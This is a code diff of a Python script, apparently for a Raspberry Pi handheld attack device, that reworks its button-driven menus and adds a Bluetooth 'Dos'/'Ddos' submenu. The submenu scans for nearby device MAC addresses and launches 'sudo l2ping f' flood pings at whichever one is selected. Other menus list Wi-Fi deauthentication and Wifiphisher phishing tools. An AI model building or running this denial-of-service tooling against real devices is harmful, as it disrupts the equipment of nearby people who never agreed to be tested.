@@ -8,6 +8,8 @@ import hashlib
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.primitives import padding
 from cryptography.hazmat.backends import default_backend
+from libraries import ddos_bluetooth
+from libraries.ddos_bluetooth import ddos
 import functools
 
 # Pin setup
@@ -233,14 +235,18 @@ def show_image(image_path, exit_event=None):
 def draw_menu(selected_index):
     # Clear previous image
     draw.rectangle((0, 0, width, height), outline=0, fill=(0, 0, 0))
+    max_options = 4
+    start_index = max(0, selected_index - (max_options // 2)) #Calcola indice partenza
 
-    for i, option in enumerate(menu_options):
-        y = i * 20  # Spacing between menu items
+    if start_index + max_options > len(menu_options):
+        start_index = len(menu_options) - max_options
+
+
+    for i  in range(start_index, min(start_index + max_options, len(menu_options))):
+        y = (i - start_index) * 20  # Spacing between menu items
+        option = menu_options[i]
         if i == selected_index:
-            text_size = draw.textbbox((0, 0), option, font=font)
-            text_width = text_size[2] - text_size[0]
-            text_height = text_size[3] - text_size[1]
-            draw.rectangle((0, y, width, y + text_height), fill=(0, 255, 0))  # Highlight background
+            draw.rectangle((0, y, width, y + 20), fill=(0, 255, 0))  # Highlight background
             draw.text((1, y), option, font=font, fill=(0, 0, 0))  # Text in black
         else:
             draw.text((1, y), option, font=font, fill=(255, 255, 255))  # Text in white
@@ -274,36 +280,63 @@ def show_message(message, duration=2):
 while True:
     draw_menu(selected_index)
 
-    prssd_key(selected_index, menu_options)
+    if GPIO.input(KEY_UP_PIN) == 0:
+        selected_index = (selected_index - 1) % len(menu_options)
+        draw_menu(selected_index)
+        time.sleep(0.3)
+                    
+    elif GPIO.input(KEY_DOWN_PIN) == 0:
+        selected_index = (selected_index + 1) % len(menu_options)
+        draw_menu(selected_index)
+        time.sleep(0.3)
 
-    if GPIO.input(KEY_PRESS_PIN) == 0:
+    elif GPIO.input(KEY_PRESS_PIN) == 0:
         selected_option = menu_options[selected_index]
-        show_message(f"Selected: {selected_option}", 1)
 
         if selected_option == "Networks":
             # Draw and handle the Network sub-menu
             menu_options = ["Wifi", "Deauth", "Firewall"]
             selected_index = 0
+ 
+            # NETWORKS
 
             while True:
                 draw_menu(selected_index)
-                prssd_key(selected_index, menu_options)
-                
-                if GPIO.input(KEY_PRESS_PIN) == 0:
+
+                if GPIO.input(KEY_UP_PIN) == 0:
+                    selected_index = (selected_index - 1) % len(menu_options)
+                    draw_menu(selected_index)
+                    time.sleep(0.3)
+                                
+                elif GPIO.input(KEY_DOWN_PIN) == 0:
+                    selected_index = (selected_index + 1) % len(menu_options)
+                    draw_menu(selected_index)
+                    time.sleep(0.3)
+
+                elif GPIO.input(KEY_PRESS_PIN) == 0:
                     selected_option = menu_options[selected_index]
-                    show_message(f"Selected: {selected_option}", 5)
 
                     if selected_option == "Wifi": 
                         menu_options = ["Pwnagotchi", "Wifiphisher"]
                         selected_index = 0
 
+                        #WIFI
+
                         while True:
                             draw_menu(selected_index)
-                            prssd_key(selected_index, menu_options)
 
-                            if GPIO.input(KEY_PRESS_PIN) == 0:
+                            if GPIO.input(KEY_UP_PIN) == 0:
+                                selected_index = (selected_index - 1) % len(menu_options)
+                                draw_menu(selected_index)
+                                time.sleep(0.3)
+                                            
+                            elif GPIO.input(KEY_DOWN_PIN) == 0:
+                                selected_index = (selected_index + 1) % len(menu_options)
+                                draw_menu(selected_index)
+                                time.sleep(0.3)
+
+                            elif GPIO.input(KEY_PRESS_PIN) == 0:
                                 selected_option = menu_options[selected_index]
-                                show_message(f"Selected: {selected_option}", 1)
 
                                 if selected_option == "Pwnagotchi": 
                                     menu_options = ["Pwnagotchi", "Wifiphisher"]
@@ -312,3 +345,63 @@ while True:
                                     time.sleep(5)
 
                                     quit()
+        
+        
+        elif selected_option == "Bluetooth":
+            # Draw and handle the Network sub-menu
+            menu_options = ["Dos", "Ddos"]
+            selected_index = 0
+
+            #
+
+            while True: 
+                draw_menu(selected_index)
+            
+                if GPIO.input(KEY_UP_PIN) == 0:
+                        selected_index = (selected_index - 1) % len(menu_options)
+                        draw_menu(selected_index)
+                        time.sleep(0.3)
+                                    
+                elif GPIO.input(KEY_DOWN_PIN) == 0:
+                    selected_index = (selected_index + 1) % len(menu_options)
+                    draw_menu(selected_index)
+                    time.sleep(0.3)
+
+                elif GPIO.input(KEY_PRESS_PIN) == 0:
+                    selected_option = menu_options[selected_index]
+
+                    #Bluetooth Dos
+                    
+                    if selected_option == "Dos":
+
+                        show_message("Wait please . . .")
+                        menu_options = []
+                        selected_index = 0
+
+                        ddos().main()       #Scan for mac address
+                        for i in ddos_bluetooth.mac_addrs:
+                            menu_options.append(i)
+                        
+                        while True:
+                            draw_menu(selected_index)
+
+                            if GPIO.input(KEY_UP_PIN) == 0:
+                                selected_index = (selected_index - 1) % len(menu_options)
+                                draw_menu(selected_index)
+                                time.sleep(0.3)
+                                    
+                            elif GPIO.input(KEY_DOWN_PIN) == 0:
+                                selected_index = (selected_index + 1) % len(menu_options)
+                                draw_menu(selected_index)
+                                time.sleep(0.3)
+
+                            elif GPIO.input(KEY_PRESS_PIN) == 0:
+                                selected_option = menu_options[selected_index]
+
+                                try:
+                                    subprocess.run(["sudo","l2ping", "f", selected_option])
+                                except:
+                                    show_message("Error: HOST IS DOWN")
+                                    time.sleep(1)
+                                    break
+            
